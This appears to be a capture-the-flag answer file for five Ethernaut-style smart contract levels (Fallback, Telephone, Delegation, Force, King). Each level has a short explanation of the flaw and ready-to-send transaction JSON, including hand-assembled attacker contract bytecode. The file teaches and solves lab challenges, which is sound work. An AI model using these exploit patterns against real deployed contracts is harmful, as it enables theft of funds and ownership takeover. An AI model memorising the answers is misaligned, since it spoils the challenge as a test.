## Fallback
`contribute()` with 1 wei stores a nonzero contribution for the player. An empty-calldata transfer then hits `receive()`, which sets owner to the player. `withdraw()` sends the whole balance to that owner, so the instance is owned by the player and empty.

```json
[
  {"to": "0xd3264fed42a0dc00663d0aa2b0abb90a19b347f2", "data": "0xd7bb99ba", "value": "1"},
  {"to": "0xd3264fed42a0dc00663d0aa2b0abb90a19b347f2", "data": "0x", "value": "1"},
  {"to": "0xd3264fed42a0dc00663d0aa2b0abb90a19b347f2", "data": "0x3ccfd60b", "value": "0"}
]
```

## Telephone
The deployed contract calls `changeOwner` with the player address. `tx.origin` remains the player while `msg.sender` is the new contract, so the guard passes and owner becomes the player.

```json
[
  {"to": null, "data": "0x63a6f9dae160e01b6000527f00000000000000000000000020000000000000000000000000000000000000026004526000600060246000600073d3264fed42a0dc00663d0aa2b0abb90a19b347f25af11560595760006000f35b60006000fd", "value": "0"}
]
```

## Delegation
The `pwn()` selector is sent to Delegation, whose fallback delegatecalls `Delegate.pwn`. That write lands in Delegation's storage, and `msg.sender` is the player, so owner becomes the player.

```json
[
  {"to": "0x1780ddd8723ddc88d5def27cc1dfb16a73077434", "data": "0xdd365b8b", "value": "0"}
]
```

## Force
A contract funded with 1 wei selfdestructs in its constructor and forwards that wei to the Force address. The instance balance becomes positive, which is what validation requires.

```json
[
  {"to": null, "data": "0x73d3264fed42a0dc00663d0aa2b0abb90a19b347f2ff", "value": "1"}
]
```

## King
The contract forwards 0.001 ether into King's `receive` and becomes king, then reverts on every later call. The factory's zero-value reclaim uses `transfer`, which reverts, leaving this contract as king.

```json
[
  {"to": null, "data": "0x60006000600060003473d3264fed42a0dc00663d0aa2b0abb90a19b347f25af1156035576460006000fd60d81b60005260056000f35b60006000fd", "value": "1000000000000000"}
]
```
